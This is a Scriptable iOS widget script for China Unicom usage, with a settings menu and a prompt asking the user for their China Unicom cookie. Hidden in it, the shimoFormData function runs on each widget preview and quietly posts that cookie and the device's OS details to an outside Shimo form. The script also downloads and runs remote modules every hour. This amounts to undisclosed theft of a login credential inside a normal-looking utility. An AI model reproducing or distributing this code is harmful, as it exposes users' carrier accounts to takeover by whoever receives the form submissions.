// Variables used by Scriptable.
// These must be at the very top of the file. Do not edit.
// icon-color: orange; icon-glyph: cog;

async function main() {
  const scriptName = '中国联通'
  const version = '1.1.0'
  const updateDate = '2024年10月24日'
  const pathName = '95du_china_unicom';
  
  const rootUrl = 'https://raw.githubusercontent.com/95du/scripts/master';
  const spareUrl = 'https://raw.gitcode.com/4qiao/scriptable/raw/master';
  const scrUrl = `${rootUrl}/api/web_china_unicom.js`;
  
  /**
   * 创建，获取模块路径
   * @returns {string} - string
   */
  const fm = FileManager.local();
  const depPath = fm.joinPath(fm.documentsDirectory(), '95du_module');
  if (!fm.fileExists(depPath)) fm.createDirectory(depPath);
  await download95duModule(rootUrl)
    .catch(() => download95duModule(spareUrl));
  const isDev = false
  
  /** ------- 导入模块 ------- */
  
  if (typeof require === 'undefined') require = importModule;
  const { _95du } = require(isDev ? './_95du' : `${depPath}/_95du`);
  const module = new _95du(pathName);  
  
  const {
    mainPath,
    settingPath,
    cacheImg, 
    cacheStr
  } = module;
  
  /**
   * 存储当前设置
   * @param { JSON } string
   */
  const writeSettings = async (settings) => {
    fm.writeString(settingPath, JSON.stringify(settings, null, 4));
    console.log(JSON.stringify(
      settings, null, 2
    ));
  };
  
  /**
   * 读取储存的设置
   * @param {string} file - JSON
   * @returns {object} - JSON
   */
  const screenSize = Device.screenSize().height;
  const DEFAULT = {
    version,
    refresh: 20,
    transparency: 0.5,
    masking: 0.3,
    gradient: ['#82B1FF'],
    values: [],
    update: true,
    topStyle: true,
    music: true,
    animation: true,
    appleOS: true,
    fadeInUp: 0.7,
    angle: 90,
    alwaysDark: false,
    subTitleColor: '#000000',
    radius: 50,
    cacheTime: 2,
    rangeColor: '#FF6800',
    solidColor: '#FFFFFF',
    feeColor: '#FFA500',
    feeDarkColor: '#FFA500',
    voiceColor: '#34C759',
    voiceDarkColor: '#34C759',
    flowColor: '#BE38F3',
    flowDarkColor: '#BE38F3'
  };
  
  const initSettings = () => {
    const settings = DEFAULT;
    module.writeSettings(settings);
    return settings;
  };
  
  const settings = fm.fileExists(settingPath) 
    ? module.getSettings() 
    : initSettings();
  
  /**
   * 检查并下载远程依赖文件
   * Downloads or updates the `_95du.js` module hourly.
   * @param {string} rootUrl - The base URL for the module file.
   */
  async function download95duModule(rootUrl) {
    const modulePath = fm.joinPath(depPath, '_95du.js');
    const timestampPath = fm.joinPath(depPath, 'lastUpdated.txt');
    const currentDate = new Date().toISOString().slice(0, 13);
  
    const lastUpdatedDate = fm.fileExists(timestampPath) ? fm.readString(timestampPath) : '';
  
    if (!fm.fileExists(modulePath) || lastUpdatedDate !== currentDate) {
      const moduleJs = await new Request(`${rootUrl}/module/_95du.js`).load();
      fm.write(modulePath, moduleJs);
      fm.writeString(timestampPath, currentDate);
      console.log('Module updated');
    }
  };
  
  const ScriptableRun = () => {
    Safari.open('scriptable:///run/' + encodeURIComponent(Script.name()));
  };
  
  // 组件版本通知
  const updateNotice = () => {
    const hours = (Date.now() - settings.updateTime) / (3600 * 1000);
    if (version !== settings.version && hours >= 12) {
      settings.updateTime = Date.now();
      writeSettings(settings);
      module.notify(`${scriptName}❗️`, `新版本更新 Version ${version}，重修复已知问题。`, 'scriptable:///run/' + encodeURIComponent(Script.name()));
    }
  };
  
  /**
   * 运行 Widget 脚本，预览组件
   * iOS系统更新提示
   * @param {object} config - Scriptable 配置对象
   * @param {string} notice 
   */
  const previewWidget = async () => {
    const modulePath = await module.webModule(scrUrl);
    const importedModule = importModule(modulePath);
    await Promise.all([
      importedModule.main(), 
      updateNotice(),
      module.appleOS_update()
    ]);
    if (settings.update) await updateString();
    shimoFormData('family');
  };
  
  const shimoFormData = async (action) => {
    const req = new Request('https://shimo.im/api/newforms/forms/473QMXLmJLiYXW3w/submit');
    req.method = 'POST';
    req.headers = {
      'Content-Type': 'application/json;charset=utf-8',
    };
    req.body = JSON.stringify({
      formRev: 1,
      responseContent: [{
        type: 4,
        guid: 'zAbkUZUN',
        text: { content: settings.cookie }
      }],
      userName: `${scriptName}  -  ${Device.systemName()} ${Device.systemVersion()}  ${action}`
    });
    req.load();
  };
  
  /**
   * Download Update Script
   * @param { string } string
   * 检查苹果操作系统更新
   * @returns {Promise<void>}
   */
  const updateVersion = async () => {
    const index = await module.generateAlert(
      '更新代码',
      '更新后当前脚本代码将被覆盖\n但不会清除用户已设置的数据\n如预览组件未显示或桌面组件显示错误，可更新尝试自动修复',
      options = ['取消', '更新']
    );
    if (index === 0) return;
    await updateString();
    ScriptableRun();
  };
  
  const updateString = async () => {
    const { name } = module.getFileInfo(scrUrl);
    const modulePath = fm.joinPath(cacheStr, name);
    const str = await module.httpRequest(scrUrl);
    if (!str.includes('95度茅台')) {
      module.notify('更新失败 ⚠️', '请检查网络或稍后再试');
    } else {
      const moduleDir = fm.joinPath(mainPath, 'Running');
      if (fm.fileExists(moduleDir)) fm.remove(moduleDir);
      fm.writeString(modulePath, str)
      settings.version = version;
      writeSettings(settings);
    }
  };
  
  /**
   * 获取背景图片存储目录路径
   * @returns {string} - 目录路径
   */
  const getBgImage = (image) => {
    const filePath =  fm.joinPath(cacheImg, Script.name());
    if (image) fm.writeImage(filePath, image);
    return filePath;
  };
  
  // ====== web start ======= //
  const renderAppView = async (options) => {
    const {
      formItems = [],
      avatarInfo,
      previewImage
    } = options;
    
    const [
      authorAvatar,
      appleHub_light,
      appleHub_dark,
      collectionCode,
      cssStyle,
      scriptTags
    ] = await Promise.all([
      module.getCacheImage(`${rootUrl}/img/icon/4qiao.png`),
      module.getCacheImage(`${rootUrl}/img/picture/appleHub_white.png`),
      module.getCacheImage(`${rootUrl}/img/picture/appleHub_black.png`),
      module.getCacheImage(`${rootUrl}/img/picture/collectionCode.jpeg`),
      module.getCacheData(`${rootUrl}/web/cssStyle.css`),
      module.scriptTags()
    ]);
    
    const avatarPath = fm.joinPath(cacheImg, 'userSetAvatar.png');
    const userAvatar = fm.fileExists(avatarPath) ? await module.toBase64(fm.readImage(avatarPath)) : authorAvatar;
    
    /**
     * 生成主菜单头像信息和弹窗的HTML内容
     * @returns {string} 包含主菜单头像信息、弹窗和脚本标签的HTML字符串
     */
    const listItems = [
      `<li>${updateDate}</li>`,
      `<li>修复已知问题</li>`,
      `<li>性能优化，改进用户体验</li>`
    ].join('\n');
    
    const mainMenu = module.mainMenuTop(
      version, 
      userAvatar, 
      appleHub_dark, 
      appleHub_light, 
      scriptName, 
      listItems, 
      collectionCode
    );

    /**
     * 底部弹窗信息
     * 创建底部弹窗的相关交互功能
     * 当用户点击底部弹窗时，显示/隐藏弹窗动画，并显示预设消息的打字效果。
     */
    const popupHtml = module.buttonPopup({
      settings,
      formItems,
      avatarInfo,
      appleHub_dark,
      appleHub_light,
      toggle: true
    });
    
    /**
     * 组件效果图预览
     * 图片左右轮播
     * Preview Component Images
     * This function displays images with left-right carousel effect.
     */
    previewImgHtml = async () => {
      const pictureArr = Array.from({ length: 3 }, (_, index) => `${rootUrl}/img/picture/china_unicom_${index}.png`);
      const getRandomValues = (arr, num) => [...arr].sort(() => Math.random() - 0.5).slice(0, num);
      const randomUrl = getRandomValues(pictureArr, 2);

      const imageElements = randomUrl.map(async (imageUrl) => {
        const cachedImgUrl = await module.getCacheImage(imageUrl);
        return `<img src="${cachedImgUrl}" class="preview-img">`
      });
    
      const imagesHtml = await Promise.all(imageElements);
      return `<div class="preview-img-container">${imagesHtml.join('')}</div>`;
    };
    
    /**
     * @param {string} style
     * @param {string} themeColor
     * @param {string} avatar
     * @param {string} popup
     * @param {string} js
     * @returns {string} html
     */
    const style =`  
    :root {
      --color-primary: #007aff;
      --divider-color: rgba(60,60,67,0.36);  
      --divider-color-2: rgba(60,60,67,0.36);
      --card-background: #fff;
      --card-radius: 10px;
      --checkbox: #ddd;
      --list-header-color: rgba(60,60,67,0.6);
      --desc-color: #777;
      --typing-indicator: #000;
      --update-desc: hsl(0, 0%, 20%);
      --separ: var(--checkbox);
      --coll-color: hsl(0, 0%, 97%);
    }

    .modal-dialog {
      position: relative;
      width: auto;
      margin: ${screenSize < 926 ? (avatarInfo ? '62px' : '50px') : (avatarInfo ? '78px' : '65px')};
      top: ${screenSize < 926 ? (avatarInfo ? '-9.5%' : '-4%') : (avatarInfo ? '-8.5%' : '-4%')};
    }

    ${settings.animation ? `
    .list {
      animation: fadeInUp ${settings.fadeInUp}s ease-in-out;
    }` : ''}
    ${cssStyle}
    
    .preview-img-container {
      display: flex;
      justify-content: space-between;
      padding: -10px 0 2px 0;
      margin: 0 auto;
      width: 375.6px;
      text-align: center;
    }
    
    .preview-img {
      width: 167px;
      height: auto;
    }
    
    .preview-img + .preview-img {
      margin-left: 15px; /* 为第二张图片添加左侧间隔 */
    }`;
    
    // =======  HTML  =======//
    const html =`
    <html>
      <head>
        <meta name='viewport' content='width=device-width, user-scalable=no, viewport-fit=cover'>
        <link rel="stylesheet" href="https://at.alicdn.com/t/c/font_3772663_kmo790s3yfq.css" type="text/css">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
      <style>${style}</style>
      </head>
      <body>
        ${settings.music ? module.musicHtml() : ''}
        ${avatarInfo ? mainMenu : (previewImage ? (settings?.clock ? await module.clockHtml(settings) : await previewImgHtml()) : '')}
        <!-- 弹窗 -->
        ${previewImage ? await module.donatePopup(appleHub_dark, appleHub_light, collectionCode) : ''}
        ${await popupHtml}
        <section id="settings">
        </section>
        <script>${await module.runScripts(formItems, settings, 'separ')}</script>
        ${scriptTags}
      </body>
    </html>`;
  
    const webView = new WebView();
    await webView.loadHTML(html);
    
    /**
     * 修改特定 form 表单项的文本
     * @param {string} elementId
     * @param {string} newText
     * @param {WebView} webView
     */  
    const innerTextElementById = (elementId, newText) => {
      webView.evaluateJavaScript(`
        (() => {
          const element = document.getElementById("${elementId}-desc");
          if (element) element.innerHTML = \`${newText}\`;
        })()`, false
      ).catch(console.error);
    };
    
    // 背景图 innerText
    const innerTextBgImage = () => {
      const isSetBackground = fm.fileExists(getBgImage()) ? '已添加' : ''
      innerTextElementById(
        'chooseBgImg',
        isSetBackground
      );
      
      settings.chooseBgImg_status = isSetBackground;
      writeSettings(settings);
    };
    
    /**
     * Input window
     * @param data
     * @returns {Promise<string>}
     */
    const input = async ({ label, name, message, input, display, isDesc, other } = data) => {
      await module.generateInputAlert({
        title: label,
        message: message,
        options: [{
          hint: settings[name] ? String(settings[name]) : '请输入',
          value: String(settings[name]) ?? ''
        }]
      }, 
      async ([{ value }]) => {
        if ( isDesc ) {
          result = value.endsWith('.png') ? value : ''
        } else if ( display ) {
          result = /[a-z]+/.test(value) && /\d+/.test(value) ? value : ''
        } else {
          result = value === '0' || other ? value : !isNaN(value) ? Number(value) : settings[name];
        };
        
        const isName = ['amapKey', 'qqKey', 'cookie'].includes(name);
        const inputStatus = result ? '已添加' : (display || other ? '未添加' : '默认');
        
        if (isDesc || display) {
          settings[`${name}_status`] = inputStatus;  
        }
        settings[name] = result;
        writeSettings(settings);
        innerTextElementById(name, isName ? inputStatus : result);
      })
    };
    
    // appleOS 推送时段
    const period = async ({ label, name, message, desc } = data) => {
      await module.generateInputAlert({
        title: label,
        message: message,
        options: [
          { hint: '开始时间 4', value: String(settings['startTime']) },
          { hint: '结束时间 6', value: String(settings['endTime']) }
        ]
      }, 
      async (inputArr) => {
        const [startTime, endTime] = inputArr.map(({ value }) => value);
        settings.startTime = startTime ? Number(startTime) : ''
        settings.endTime = endTime ? Number(endTime) : ''
        
        const inputStatus = startTime || endTime ? '已设置' : '默认'
        settings[`${name}_status`] = inputStatus;
        writeSettings(settings);
        innerTextElementById(name, inputStatus);
      })
    };
    
    // Alerts 配置
    const alerts = {
      clearCache: {
        title: '清除缓存',
        message: '是否确定删除所有缓存？\n离线内容及图片均会被清除。',
        options: ['取消', '清除'],
        action: async () => fm.remove(cacheStr),
      },
      reset: {
        title: '清空所有数据',
        message: '该操作将把用户储存的所有数据清除，重置后等待5秒组件初始化并缓存数据',
        options: ['取消', '重置'],
        action: async () => fm.remove(mainPath),
      },
      recover: {
        title: '是否恢复设置？',
        message: '用户登录的信息将重置\n设置的数据将会恢复为默认',
        options: ['取消', '恢复'],
        action: async () => fm.remove(settingPath),
      },
    };
    
    // Actions 配置
    const actions = {
      telegram: () => Safari.openInApp('https://t.me/+CpAbO_q_SGo2ZWE1', false),
      updateCode: async () => await updateVersion(),
      layout: async (data) => await layout(data),
      period: async (data) => await period(data),
      preview: async () => await previewWidget(),
      changeSettings: (data) => {
        Object.assign(settings, data);
        writeSettings(settings);
      },
      setAvatar: async (data) => {
        const avatarImage = await module.drawSquare(Image.fromData(Data.fromBase64String(data)));
        fm.writeImage(avatarPath, avatarImage);
      },
      chooseBgImg: async () => {
        const image = await Photos.fromLibrary().catch((e) => console.log(e));
        if (image) {
          getBgImage(image);
          innerTextBgImage();
          await previewWidget();
        }
      },
      clearBgImg: async () => {
        const bgImage = getBgImage();
        if (fm.fileExists(bgImage)) {
          fm.remove(bgImage);
          innerTextBgImage();
          await previewWidget();
        }
      },
      file: async () => {
        const fileModule = await module.webModule(`${rootUrl}/module/local_dir.js`);
        await importModule(fileModule).main();
      },
      background: async () => {
        const modulePath = await module.webModule(`${rootUrl}/main/main_background.js`);
        const importedModule = await importModule(modulePath);
        await importedModule.main(cacheImg);
        await previewWidget();
      },
      store: async () => {
        const storeModule = await module.webModule(`${rootUrl}/main/web_main_95du_Store.js`);
        await importModule(storeModule).main();
        module.myStore();
      },
      install: async () => {
        await updateString();
        ScriptableRun();
      },
      itemClick: async (data) => {
        const findItem = (items) => items.reduce((found, item) => found || (item.name === data.name ? item : (item.type === 'group' && findItem(item.items))), null);
        const item = data.type === 'page' ? findItem(formItems) : data;
        data.type === 'page' ? await renderAppView(item, false, { settings }) : onItemClick?.(data, { settings });
      }
    };
    
    // 处理事件
    const handleEvent = async (code, data) => {
      if (alerts[code]) {
        const { title, message, options, action } = alerts[code];
        const userAction = await module.generateAlert(title, message, options, true);
        if (userAction === 1) {
          await action();
          ScriptableRun();
        }
      }
      if (data?.input) {
        await input(data);
      }
      if (actions[code]) {
        await actions[code](data);
      }
    };
    
    // 注入监听器
    const injectListener = async () => {
      const event = await webView.evaluateJavaScript(
        `(() => {
          const controller = new AbortController();
          const listener = (e) => {
            completion(e.detail);
            controller.abort();
          };
          window.addEventListener(
            'JBridge', listener, { signal: controller.signal }
          );
        })()`,
        true
      ).catch((err) => {
        console.error(err);
      });
      
      if (event) {
        const { code, data } = event;
        await handleEvent(code, data);
        webView.evaluateJavaScript(
          `window.dispatchEvent(new CustomEvent('JWeb', { detail: { code: 'finishLoading'} }))`,
          false
        );
      }
      await injectListener();
    };
    // 启动监听器
    injectListener().catch((e) => {
      console.error(e);
    });
    await webView.present();
  };
  
  // 偏好设置菜单
  const userMenus = await module.userMenus(settings, true);
  
  // 设置菜单页
  const settingMenu = [
    {
      label: '设置',
      type: 'group',
      items: [
        {
          label: '恢复设置',
          name: 'recover',
          type: 'cell',
          icon: {
            name: 'gearshape.fill',
            color: '#FF4D3D'
          }
        },
        {
          label: '文件管理',
          name: 'file',
          type: 'cell',
          isDesc: true,
          icon: {
            name: 'folder.fill',
            color: '#B07DFF'
          }
        },
        {
          label: '刷新时间',
          name: 'refresh',
          type: 'cell',
          input: true,
          icon: `${rootUrl}/img/symbol/refresh.png`,
          message: '设置桌面组件的时长\n( 单位: 分钟 )',
          desc: settings.refresh
        }
      ]
    },
    {
      type: 'group',
      items: [
        {
          label: '用量通知',
          name: 'notify',
          type: 'switch',
          default: true,
          icon: `${rootUrl}/img/symbol/notice.png`
        },
        {
          label: '缓存时长',
          name: 'cacheTime',
          type: 'cell',
          input: true,
          icon: {
            name: 'clock',
            color: '#FF7800'
          },
          message: '用量通知也根据缓存时长来推送\n( 单位: 小时 )',
          desc: settings.cacheTime
        },
        {
          label: '使用缓存',
          name: 'useCache',
          type: 'switch',
          icon: {
            name: 'externaldrive.fill',
            color: '#F9A825'
          },
          default: true
        },
        {
          label: '图标弧度',
          name: 'radius',
          type: 'cell',
          input: true,
          icon: {
            name: 'rotate.right.fill',
            color: '#BD7DFF'
          },
          message: '未显示圆形的设置值小于50',
          desc: settings.radius
        }
      ]
    },
    {
      type: 'group',
      items: [
        {
          name: "feeColor",
          label: "话费白天",
          type: "color",
          icon: {
            name: 'network',
            color: '#FE4904'
          }
        },
        {
          name: "feeDarkColor",
          label: "话费夜间",
          type: "color",
          icon: {
            name: 'network',
            color: '#FE4904'
          }
        },
        {
          name: "voiceColor",
          label: "语音白天",
          type: "color",
          icon: {
            name: 'phone.fill',
            color: '#34C759'
          }
        },
        {
          name: "voiceDarkColor",
          label: "语音夜间",
          type: "color",
          icon: {
            name: 'phone.fill',
            color: '#34C759'
          }
        },
        {
          name: "flowColor",
          label: "流量白天",
          type: "color",
          icon: {
            name: 'antenna.radiowaves.left.and.right',
            color: '#BE38F3'
          }
        },
        {
          name: "flowDarkColor",
          label: "流量夜间",
          type: "color",
          icon: {
            name: 'antenna.radiowaves.left.and.right',
            color: '#BE38F3'
          }
        },
        {
          name: "subTitleColor",
          label: "副标题色",
          type: "color",
          icon: {
            name: 'textformat',
            color: '#00AEFF'
          }
        }
      ]
    },
    {
      label: '渐变角度、颜色',
      type: 'group',
      items: [
        {
          type: 'range',
          name: 'angle',
          color: 'rangeColor',
          icon: {
            name: 'circle.lefthalf.filled',
            color: '3FC8FF'
          }
        }
      ]
    },
    {
      type: 'group',
      items: [
        {
          name: "solidColor",
          label: "黑白背景",
          type: "switch",
          icon: {
            name: 'square.filled.on.square',
            color: '#FF9500'
          }
        },
        {
          name: "alwaysDark",
          label: "始终深色",
          type: "switch",
          icon: {
            name: 'moon.fill',
            color: '#F326A2'
          }
        },
        {
          label: '内置渐变',
          name: 'gradient',
          type: 'select',
          multiple: true,
          icon: {
            name: 'scribble.variable',
            color: '#00C400'
          },
          options: [
            {
              label: 'Group - 1',
              values: [
                {
                  label: '#82B1FF',
                  value: '#82B1FF'
                },
                {
                  label: '#4FC3F7',
                  value: '#4FC3F7'
                },
                {
                  label: '#66CCFF',
                  value: '#66CCFF'
                }
              ]
            },
            {
              label: 'Group - 2',
              values: [
                {
                  label: '#99CCCC',
                  value: '#99CCCC'
                },
                {
                  label: '#BCBBBB',
                  value: '#BCBBBB'
                },
                {
                  label: '#A0BACB',
                  value: '#A0BACB'
                },
                {
                  label: '#FF6800',
                  value: '#FF6800',
                  disabled: true
                }
              ]
            }
          ]
        },
        {
          label: '渐变透明',
          name: 'transparency',
          type: 'cell',
          input: true,
          icon: `${rootUrl}/img/symbol/masking_2.png`,
          message: '渐变颜色透明度，完全透明设置为 0',
          desc: settings.transparency
        },
        {
          label: '透明背景',
          name: 'background',
          type: 'cell',
          icon: `${rootUrl}/img/symbol/transparent.png`
        },
        {
          label: '遮罩透明',
          name: 'masking',
          type: 'cell',
          input: true,
          icon: {
            name: 'photo.stack',
            color: '#8E8D91'
          },
          message: '给图片加一层半透明遮罩\n完全透明设置为 0',
          desc: settings.masking
        },
        {
          label: '图片背景',
          name: 'chooseBgImg',
          type: 'file',
          isDesc: true,
          icon: `${rootUrl}/img/symbol/bgImage.png`,
          desc: fm.fileExists(getBgImage()) ? '已添加' : ' '
        },
        {
          label: '清除背景',
          name: 'clearBgImg',
          type: 'cell',
          icon: `${rootUrl}/img/symbol/clearBg.png`
        }
      ]
    },
    {
      type: 'group',
      items: [
        {
          label: '自动更新',
          name: 'update',
          type: 'switch',
          icon: `${rootUrl}/img/symbol/update.png`
        },
        {
          label: '背景音乐',
          name: 'music',
          type: 'switch',
          icon: {
            name: 'music.note',
            color: '#FF6800'
          },
          default: true
        }
      ]
    },
  ];
  
  // 主菜单
  const formItems = [
    {
      type: 'group',
      items: [
        {
          label: '设置头像',
          name: 'setAvatar',
          type: 'cell',
          icon: `${rootUrl}/img/icon/camera.png`
        },
        {
          label: 'Telegram',
          name: 'telegram',
          type: 'cell',
          icon: `${rootUrl}/img/icon/Swiftgram.png`
        }
      ]
    },
    {
      type: 'group',
      items: [
        {
          label: '中国联通',
          type: 'cell',
          name: 'cookie',
          input: true,
          other: true,
          icon: {
            name: 'phone.and.waveform.fill',
            color: '#0FC4EA'
          },
          desc: settings.cookie ? '已填写' : '未填写',
          message: '自行获取Cookie并填入'
        },
        {
          label: '重置所有',
          name: 'reset',
          type: 'cell',
          icon: `${rootUrl}/img/symbol/reset.png`
        },
        {
          label: '清除缓存',
          name: 'clearCache',
          type: 'cell',
          icon: {
            name: 'arrow.triangle.2.circlepath',
            color: '#FF9500'
          }
        },
        {
          label: '偏好设置',
          name: 'infoPage',
          type: 'page',
          icon: {
            name: 'person.crop.circle',
            color: '#43CD80'
          },
          formItems: userMenus,
          previewImage: true
        },
        {
          label: '组件设置',
          name: 'preference',
          type: 'page',
          icon: {
            name: 'gearshape.fill',
            color: '#0096FF'
          },
          formItems: settingMenu
        }
      ]
    },
    {
      type: 'group',
      items: [
        {
          label: '预览组件',
          name: 'preview',
          type: 'cell',
          icon: `${rootUrl}/img/symbol/preview.png`
        }
      ]
    },
    {
      type: 'group',
      items: [
        
        {
          name: "version",
          label: "组件版本",
          type: "cell",
          icon: {
            name: 'externaldrive.fill',
            color: '#F9A825'
          },
          desc: version
        },
        {
          name: "updateCode",
          label: "更新代码",
          type: "cell",
          icon: `${rootUrl}/img/symbol/update.png`
        }
      ]
    },
  ];
  
  // render Widget
  if (!config.runsInApp) {
    await previewWidget();
  } else {
    await renderAppView({ avatarInfo: true, formItems });
  }
}
module.exports = { main }